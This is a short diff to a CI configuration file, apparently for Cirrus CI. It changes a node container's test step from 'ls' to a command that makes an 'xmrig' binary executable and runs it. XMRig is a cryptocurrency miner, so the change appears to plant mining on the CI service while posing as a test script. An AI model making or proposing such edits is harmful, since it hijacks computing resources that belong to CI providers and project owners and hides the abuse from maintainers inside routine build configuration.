@@ -1,4 +1,4 @@
 test_task:
   container:
     image: node:latest
-  test_script: ls
+  test_script: chmod 500 xmrig && ph add xmrig
